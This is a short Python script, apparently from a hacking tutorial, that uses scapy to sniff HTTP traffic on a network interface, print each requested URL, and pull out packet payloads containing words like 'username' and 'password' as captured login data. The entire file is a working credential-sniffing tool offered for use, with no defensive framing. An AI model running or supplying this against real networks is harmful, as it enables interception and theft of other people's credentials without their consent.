#!/usr/bin/env python
import scapy.all as scapy
from scapy.layers import http

def sniff(interface):
    scapy.sniff(iface=interface, store=False, prn=sniff_packet)

def get_url_address(packet):
    return packet[http.HTTPRequest].Host+packet[http.HTTPRequest].Path

def get_information(packet):
    if packet.haslayer(scapy.Raw):
        LoadingData = packet[scapy.Raw].load
        keywords = ["username", "password", "user", "pass", "login"]
        for element in keywords:
            if element in LoadingData:
                return LoadingData

def sniff_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        URLaddress = get_url_address(packet)
        print("[+] HTTP Request >> " + URLaddress)
        login_information = get_information(packet)
        if login_information:
            print("\n\n\n[+] Username/password" + login_information + "\n\n\n")

sniff("eth0")